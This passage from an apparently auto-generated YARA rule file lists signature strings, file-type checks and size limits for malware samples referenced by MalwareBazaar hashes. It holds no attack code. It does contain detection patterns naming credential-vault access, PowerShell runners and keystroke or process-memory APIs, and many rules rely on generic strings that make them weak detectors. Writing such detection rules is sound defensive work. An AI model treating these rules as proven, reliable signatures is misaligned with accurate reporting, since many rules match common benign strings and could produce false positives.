        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD"
        $s6 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s7 = "System.Drawing.Bitmap"
        $s8 = "/Gets or sets an annotation's content alignment."
        $s9 = "JGets or sets a flag, which indicates if an annotation anchor can be moved."
        $s10 = "CGets or sets a flag, which indicates if an annotation can be moved."
        $s11 = "fGets or sets a flag which defines if SmartLabels are allowed to be drawn outside of the plotting area."
        $s12 = "TGets or sets a flag, which indicates if the polygon annotation's path can be edited."
        $s13 = "EGets or sets a flag, which indicates if an annotation can be resized."
        $s14 = "FGets or sets a flag, which indicates if an annotation can be selected."
        $s15 = "KGets or sets a flag, which indicates if an annotation's text can be edited."
        $s16 = "@Gets or sets annotation object alignment relative to the anchor."
        $s17 = "9Gets or sets the data point an annotation is anchored to."
        $s18 = ";Gets or sets data point name the annotation is attached to."
        $s19 = "EGets or sets an annotation X position's offset from the anchor point."
        $s20 = "EGets or sets an annotation Y position's offset from the anchor point."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1124KB and
        all of them
}

rule Linux_7df2b3290cd7f892dbec1ed745f6bad48adf0fb0f6c7137d93aab754e74cea80
{
    meta:
        description = "Auto ML: 7df2b3290cd7f892dbec1ed745f6bad48adf0fb0f6c7137d93aab754e74cea80"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "time.DatH"
        $s2 = ";fileu"
        $s3 = "%!(BADWIN"
        $s4 = "{{templaL"
        $s5 = "Cmds"
        $s6 = "File"
        $s7 = "Load"
        $s8 = "Open"
        $s9 = "Read"
        $s10 = "file"
        $s11 = "load"
        $s12 = "read"
        $s13 = "user"
        $s14 = "Close"
        $s15 = "GetIP"
        $s16 = "Pread"
        $s17 = "Reset"
        $s18 = "SetIn"
        $s19 = "Write"
        $s20 = "close"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 3676KB and
        all of them
}

rule Windows_7e18416de1803f8e39a3f4459532f5debeeb67d0d7e497b64b23de4cf698c062
{
    meta:
        description = "Auto ML: 7e18416de1803f8e39a3f4459532f5debeeb67d0d7e497b64b23de4cf698c062"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ReadOnlyCollection`1"
        $s5 = "kernel32"
        $s6 = "Microsoft.Win32"
        $s7 = "WriteInt32"
        $s8 = "<Module>"
        $s9 = "CreateDC"
        $s10 = "DeleteDC"
        $s11 = "get_ASCII"
        $s12 = "System.IO"
        $s13 = "CreateFileTransactedW"
        $s14 = "CreateFileW"
        $s15 = "GetFileAttributesW"
        $s16 = "GetFileAttributesExW"
        $s17 = "UploadData"
        $s18 = "set_Verb"
        $s19 = "GetHdc"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 893KB and
        all of them
}

rule Linux_0bb44293af42319e7124a88763f58246706cdcc2c299b6d8eb6c4d0b37fef574
{
    meta:
        description = "Auto ML: 0bb44293af42319e7124a88763f58246706cdcc2c299b6d8eb6c4d0b37fef574"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/system"
        $s2 = "/ (deleted)"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "Windows XP"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 62KB and
        all of them
}

rule Linux_7e27dd01bf2a1d8c2cfb8b5e19b9d2ceb9e2fbfc5bb7a65eb1a487b42a1c256c
{
    meta:
        description = "Auto ML: 7e27dd01bf2a1d8c2cfb8b5e19b9d2ceb9e2fbfc5bb7a65eb1a487b42a1c256c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "able to winec"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 40KB and
        all of them
}

rule Linux_7e455b30878e3e01139eb0e29725ac81f19590d1b47eaedb780146196578cb4f
{
    meta:
        description = "Auto ML: 7e455b30878e3e01139eb0e29725ac81f19590d1b47eaedb780146196578cb4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = ".text"
        $s5 = ".data.rel.ro"
        $s6 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 146KB and
        all of them
}

rule Windows_7e924017dc6019c756ee6dd390babd32bef51fc7aa0722c18a65b8d2260056d6
{
    meta:
        description = "Auto ML: 7e924017dc6019c756ee6dd390babd32bef51fc7aa0722c18a65b8d2260056d6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Unable to resolve HTTP prox"
        $s5 = "get_Item1"
        $s6 = "kernel32"
        $s7 = "Microsoft.Win32"
        $s8 = "user32"
        $s9 = "ReadInt32"
        $s10 = "get_Item2"
        $s11 = "get_Item3"
        $s12 = "ReadInt64"
        $s13 = "ReadInt16"
        $s14 = "VaultGetItem_WIN7"
        $s15 = "VaultGetItem_WIN8"
        $s16 = "<Module>"
        $s17 = "FileHandleID"
        $s18 = "fileHandleID"
        $s19 = "lpdwProcessID"
        $s20 = "processID"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 239KB and
        all of them
}

rule Linux_7ec06a47b317f5f00788b245b48b893c59420315002d03f943578bb5ab1b4be7
{
    meta:
        description = "Auto ML: 7ec06a47b317f5f00788b245b48b893c59420315002d03f943578bb5ab1b4be7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "socket:["
        $s5 = "processor"
        $s6 = "/sys/devices/system/cpu"
        $s7 = ".text"
        $s8 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 59KB and
        all of them
}

rule Windows_7f005e91edbeaf3893ec02289059166f89f4fdde301ff91922ce2761fcc49ad7
{
    meta:
        description = "Auto ML: 7f005e91edbeaf3893ec02289059166f89f4fdde301ff91922ce2761fcc49ad7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4410KB and
        all of them
}

rule Android_7f1c986ae33571b0bfaae617d9e4bb02bd2c5e5dab71a24ba6c68d650148fee2
{
    meta:
        description = "Auto ML: 7f1c986ae33571b0bfaae617d9e4bb02bd2c5e5dab71a24ba6c68d650148fee2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "META-INF/androidx.documentfile_documentfile.version3"
        $s2 = "META-INF/androidx.loader_loader.version3"
        $s3 = "META-INF/androidx.sharetarget_sharetarget.version3"
        $s4 = "META-INF/annotation-experimental_release.kotlin_modulec```f```"
        $s5 = "assets/.appkeyff96a5e6109d8c98PK"
        $s6 = "assets/PhoneFormats.dat"
        $s7 = "assets/arctic.attheme"
        $s8 = "assets/bluebubbles.attheme"
        $s9 = "assets/countries.txt}X"
        $s10 = "assets/darkblue.attheme"
        $s11 = "assets/day.attheme}Z"
        $s12 = "assets/emoji/0_0.png"
        $s13 = "assets/emoji/0_1.png"
        $s14 = "assets/emoji/0_10.png"
        $s15 = "assets/emoji/0_100.png"
        $s16 = "assets/emoji/0_1000.png"
        $s17 = "assets/emoji/0_1001.png"
        $s18 = "assets/emoji/0_1002.png"
        $s19 = "assets/emoji/0_1003.png"
        $s20 = "assets/emoji/0_1004.png"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 64133KB and
        all of them
}

rule Windows_7f2a0809944a8ada70af8dca8db7ebd2dcd62fdfa3dea33f36dff97cb5025a04
{
    meta:
        description = "Auto ML: 7f2a0809944a8ada70af8dca8db7ebd2dcd62fdfa3dea33f36dff97cb5025a04"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".textbss="
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.rsrc"
        $s6 = "@.reloc"
        $s7 = "vtEmpty"
        $s8 = "fLoadable"
        $s9 = "PowerShellRunner"
        $s10 = "PowerShellRunner.PowerShellRunner"
        $s11 = "Unknown Filename"
        $s12 = "Unknown Module Name"
        $s13 = "RegOpenKeyExW"
        $s14 = "RegCloseKey"
        $s15 = "PDBOpenValidate5"
        $s16 = "delete"
        $s17 = "delete[]"
        $s18 = "`placement delete closure'"
        $s19 = "`placement delete[] closure'"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 510KB and
        all of them
}

rule Linux_7f5ab956e704bd0787b9ad2ea47c60cf43c02c5c2c18b72edb467ed35281679f
{
    meta:
        description = "Auto ML: 7f5ab956e704bd0787b9ad2ea47c60cf43c02c5c2c18b72edb467ed35281679f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "http://"
        $s2 = "https://"
        $s3 = "/ (deleted)"
        $s4 = "/lib/systemd/"
        $s5 = "/system/system/bin/"
        $s6 = "/data/module/jdk"
        $s7 = "No such file or directory"
        $s8 = "No such process"
        $s9 = "Interrupted system call"
        $s10 = "Bad file descriptor"
        $s11 = "No child processes"
        $s12 = "Resource temporarily unavailable"
        $s13 = "File exists"
        $s14 = "Too many open files in system"
        $s15 = "Too many open files"
        $s16 = "Text file busy"
        $s17 = "File too large"
        $s18 = "Read-only file system"
        $s19 = "File name too long"
        $s20 = "Level 3 reset"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 112KB and
        all of them
}

rule Windows_7f921526449963559a911dffeb3fff1cbbfa64dd3189ad36d9b91c495e83446c
{
    meta:
        description = "Auto ML: 7f921526449963559a911dffeb3fff1cbbfa64dd3189ad36d9b91c495e83446c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1993KB and
        all of them
}

rule Windows_7faf4077f98ed7480a73277e9272b40f801928a9796742d6aca71f0f7989fa28
{
    meta:
        description = "Auto ML: 7faf4077f98ed7480a73277e9272b40f801928a9796742d6aca71f0f7989fa28"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_0bc70feb553bde362d94c650261f67ba9c56502ad04c838ff2d7c4fc49a45fb1
{
    meta:
        description = "Auto ML: 0bc70feb553bde362d94c650261f67ba9c56502ad04c838ff2d7c4fc49a45fb1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "GetNativeSystemInf"
        $s3 = "V-.kernel32.dl%"
        $s4 = "LoadA5e"
        $s5 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\"/>"
        $s6 = "KERNEL32.DLL"
        $s7 = "ADVAPI32.dll"
        $s8 = "COMCTL32.dll"
        $s9 = "COMDLG32.dll"
        $s10 = "IPHLPAPI.DLL"
        $s11 = "OLEAUT32.dll"
        $s12 = "PSAPI.DLL"
        $s13 = "SHELL32.dll"
        $s14 = "USER32.dll"
        $s15 = "USERENV.dll"
        $s16 = "UxTheme.dll"
        $s17 = "VERSION.dll"
        $s18 = "WININET.dll"
        $s19 = "WINMM.dll"
        $s20 = "WSOCK32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 714KB and
        all of them
}

rule Windows_7fc4b31a1488f9b2c8211669fa3fa97b723e40cabed7195b9c745357588bc3e9
{
    meta:
        description = "Auto ML: 7fc4b31a1488f9b2c8211669fa3fa97b723e40cabed7195b9c745357588bc3e9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "yciloPenolC"
        $s6 = "yciloPtseT"
        $s7 = "noitatonnAtseT"
        $s8 = "reussItseT"
        $s9 = "dohteMtseT"
        $s10 = "dohteMpotS"
        $s11 = "ytreporPtseT"
        $s12 = "reifitnedItseT"
        $s13 = "rotisiVygetartS_m"
        $s14 = "etalpmeTstseT_"
        $s15 = "redaeRtseT"
        $s16 = "retropxEtseT"
        $s17 = "labolGetadpU"
        $s18 = "labolGetirW"
        $s19 = "labolGetadilaV"
        $s20 = "labolGtseT"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2514KB and
        all of them
}

rule Windows_7fea77743a93b1bc786b7dc63434b71c87e046b34567bc2cd49919113d9c6b95
{
    meta:
        description = "Auto ML: 7fea77743a93b1bc786b7dc63434b71c87e046b34567bc2cd49919113d9c6b95"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_80151a8f1a291643f0753f68dd304fb0767f387dcf14b3141531e3061fa36347
{
    meta:
        description = "Auto ML: 80151a8f1a291643f0753f68dd304fb0767f387dcf14b3141531e3061fa36347"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".text"
        $s4 = "`.rdata"
        $s5 = "@.data"
        $s6 = ".rsrc"
        $s7 = "@.reloc"
        $s8 = "kernel32.dll"
        $s9 = "ntdll.dll"
        $s10 = "user32.dll"
        $s11 = "user32"
        $s12 = "Kernel32.dll"
        $s13 = "kernel32"
        $s14 = "CallWindowProcA"
        $s15 = "UnhookWindowsHookEx"
        $s16 = "ReadProcessMemory"
        $s17 = "WriteProcessMemory"
        $s18 = "NtShutdownSystem"
        $s19 = "GetCursorPos"
        $s20 = "GetAsyncKeyState"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1768KB and
        all of them
}

rule Windows_8019a5a5fbb0b100c2d3189fc6fc5a755563f7fc9b635cff45cdb427706e5619
{
    meta:
        description = "Auto ML: 8019a5a5fbb0b100c2d3189fc6fc5a755563f7fc9b635cff45cdb427706e5619"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "B.rsrc"
        $s6 = "Getw5"
        $s7 = "P5gEtA%"
        $s8 = "opEN"
        $s9 = "GetD"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "template-parameter-"
        $s16 = "`template-parameter-"
        $s17 = "`non-type-template-parameter"
        $s18 = "`template-type-parameter-"
        $s19 = "`template-parameter"
        $s20 = "`template static data member constructor helper'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5800KB and
        all of them
}

rule Windows_804f07bc39f1916a886c0ff54055641e124f198e66e79239bb7bf126ae1f96ae
{
    meta:
        description = "Auto ML: 804f07bc39f1916a886c0ff54055641e124f198e66e79239bb7bf126ae1f96ae"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 179KB and
        all of them
}

rule Windows_80a3a6daec5aabfd25a15094061bcfbd8c9be51b40e19994815aeebc403e9a15
{
    meta:
        description = "Auto ML: 80a3a6daec5aabfd25a15094061bcfbd8c9be51b40e19994815aeebc403e9a15"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "could not empty working set for process #%d [%s]"
        $s5 = "could not empty working set for process #%d"
        $s6 = "USAGE: empty.exe {pid | task-name}"
        $s7 = "kernel32.dll"
        $s8 = "System Process"
        $s9 = "OpenProcessToken failed with %d"
        $s10 = "GetCommandLineA"
        $s11 = "GetProcAddress"
        $s12 = "GetModuleHandleA"
        $s13 = "GetTickCount"
        $s14 = "GetCurrentThreadId"
        $s15 = "GetCurrentProcessId"
        $s16 = "GetSystemTimeAsFileTime"
        $s17 = "TerminateProcess"
        $s18 = "GetCurrentProcess"
        $s19 = "SetUnhandledExceptionFilter"
        $s20 = "KERNEL32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6249KB and
        all of them
}

rule Windows_80cbf7bf0909ce0c9685c4529506d58d49042c0fe73d179dd31adea6330362f0
{
    meta:
        description = "Auto ML: 80cbf7bf0909ce0c9685c4529506d58d49042c0fe73d179dd31adea6330362f0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "sEtL"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "CorExitProcess"
        $s9 = "An application has made an attempt to load the C runtime library incorrectly."
        $s10 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s11 = "- Attempt to initialize the CRT more than once."
        $s12 = "- unable to open console device"
        $s13 = "- unexpected multithread lock error"
        $s14 = "- not enough space for thread data"
        $s15 = "- floating point support not loaded"
        $s16 = "`local static thread guard'"
        $s17 = "`placement delete[] closure'"
        $s18 = "`placement delete closure'"
        $s19 = "delete[]"
        $s20 = "delete"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 179KB and
        all of them
}

rule Windows_80da1b7360c8d9aa99ae826402e7232f5b2b1112a81bd29765596a60c8502c66
{
    meta:
        description = "Auto ML: 80da1b7360c8d9aa99ae826402e7232f5b2b1112a81bd29765596a60c8502c66"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "`.reloc"
        $s4 = "mscoree.dll"
        $s5 = "<Module>"
        $s6 = "GetHINSTANCE"
        $s7 = "System.IO"
        $s8 = "Read"
        $s9 = "get_CurrentThread"
        $s10 = "thread"
        $s11 = "Load"
        $s12 = "get_IsAttached"
        $s13 = "set_IsBackground"
        $s14 = "GetMethod"
        $s15 = "CreateInstance"
        $s16 = "GetTypeFromHandle"
        $s17 = "get_Module"
        $s18 = "LoadModule"
        $s19 = "get_ManifestModule"
        $s20 = "get_Name"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 581KB and
        all of them
}

rule Windows_80e12c2425ec7b8aa8913df82bd47c0c1a62f6539df22b6bf1ddab8b1694e3e8
{
    meta:
        description = "Auto ML: 80e12c2425ec7b8aa8913df82bd47c0c1a62f6539df22b6bf1ddab8b1694e3e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "Cannot create node of type {0}."
        $s6 = "tThe XmlReader passed in to construct this XmlValidatingReaderImpl must be an instance of a System.Xml.XmlTextReader."
        $s7 = "XInference cannot handle entity references. Pass in an 'XmlReader' that expands entities."
        $s8 = "TExpected 'Extension' within 'SimpleContent'. Schema was not created using this tool."
        $s9 = "Ssequence expected to contain elements only. Schema was not created using this tool."
        $s10 = "@Expected simple content. Schema was not created using this tool."
        $s11 = "The derived wildcard's occurrence range is not a valid restriction of the base wildcard's occurrence range, Any:Any -- NSSubset Rule 1."
        $s12 = "The derived wildcard's namespace constraint must be an intensional subset of the base wildcard's namespace constraint, Any:Any -- NSSubset Rule2."
        $s13 = "The {base type definition} must have an {attribute wildcard} and the {target namespace} of the R's {attribute declaration} must be valid with respect to that wildcard."
        $s14 = "4Cannot load the schema for the namespace '{0}' - {1}"
        $s15 = "4Cannot load the schema from the location '{0}' - {1}"
        $s16 = "]Schema for targetNamespace '{0}' already present in collection and being used for validation."
        $s17 = "CThe '{0}' attribute has already been declared for this ElementType."
        $s18 = "3The attributeGroup '{0}' has already been declared."
        $s19 = "#The attribute '{0}' already exists."
        $s20 = "0The complexType '{0}' has already been declared."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1234KB and
        all of them
}

rule Windows_80f1abd5006e75632ccce2516b48be9abf23a9bf80a4dceeee1b73a6b7251b3a
{
    meta:
        description = "Auto ML: 80f1abd5006e75632ccce2516b48be9abf23a9bf80a4dceeee1b73a6b7251b3a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_VkbuXGfK"
        $s6 = "System.IO"
        $s7 = "DELETEHELPER"
        $s8 = "System.Data"
        $s9 = "loadData"
        $s10 = "Read"
        $s11 = "QuanLyHS_Load"
        $s12 = "QuanLyGV_Load"
        $s13 = "add_Load"
        $s14 = "ManHinhChinh_Load"
        $s15 = "DangNhap_Load"
        $s16 = "DangKy_Load"
        $s17 = "TTGiangDay_Load"
        $s18 = "get_OrangeRed"
        $s19 = "get_Checked"
        $s20 = "set_Checked"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 748KB and
        all of them
}

rule Windows_00f82f5933b6f1bae3193eeefb7d5b7b6148028d7985a9b489e141f315ecf7c7
{
    meta:
        description = "Auto ML: 00f82f5933b6f1bae3193eeefb7d5b7b6148028d7985a9b489e141f315ecf7c7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "openDestinationFolderToolStripMenuItem1"
        $s5 = "ReadInt32"
        $s6 = "<Module>"
        $s7 = "get_FormatID"
        $s8 = "get_GitHubURI"
        $s9 = "set_GitHubURI"
        $s10 = "System.IO"
        $s11 = "get_TimerIntervalS"
        $s12 = "set_TimerIntervalS"
        $s13 = "get_DestinationFolderS"
        $s14 = "set_DestinationFolderS"
        $s15 = "get_FileFormatS"
        $s16 = "set_FileFormatS"
        $s17 = "get_DeviceIndexS"
        $s18 = "set_DeviceIndexS"
        $s19 = "get_JpegQualityS"
        $s20 = "set_JpegQualityS"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 666KB and
        all of them
}

rule Windows_0bc90706defe0f5defbc5be90ea4d4c14ec01ad3b85ac35baa4db1b9906bcad6
{
    meta:
        description = "Auto ML: 0bc90706defe0f5defbc5be90ea4d4c14ec01ad3b85ac35baa4db1b9906bcad6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3816KB and
        all of them
}

rule Linux_81921ea5f890589516c8bdf261b819446bc5e59403b83c8ec802f638ffd8065c
{
    meta:
